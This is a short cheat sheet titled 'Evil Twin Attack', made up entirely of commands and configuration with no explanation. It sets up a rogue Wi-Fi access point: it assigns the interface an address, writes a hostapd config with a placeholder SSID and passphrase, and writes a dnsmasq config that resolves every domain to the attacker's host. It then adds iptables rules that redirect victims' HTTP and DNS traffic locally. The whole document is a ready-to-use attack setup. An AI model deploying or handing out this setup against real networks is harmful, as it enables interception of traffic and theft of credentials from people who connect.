# Evil Twin Attack

```
ip addr flush dev [interface]
ip addr add 10.10.10.1/24 dev [interface]
```

```
interface=[interface]
driver=nl80211
ssid=[ssid]
hw_mode=g
channel=[channel]
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=[password]
wpa_pairwise=CCMP
rsn_pairwise=CCMP
```

```
interface=wlan0
dhcp-range=10.10.10.2,10.10.10.10,255.255.255.0,12h
dhcp-option=3,10.10.10.1
dhcp-option=6,10.10.10.1
address=/#/10.10.10.1
no-resolv
log-dhcp
```

```
iptables -F
iptables -t nat -F
iptables -X
iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 80 -j DNAT --to-destination 10.10.10.1:80
iptables -t nat -A PREROUTING -i [interface] -p udp --dport 53 -j DNAT --to-destination 10.10.10.1:53
iptables -A INPUT -i [interface] -j ACCEPT
iptables -t nat -L -n -v
```
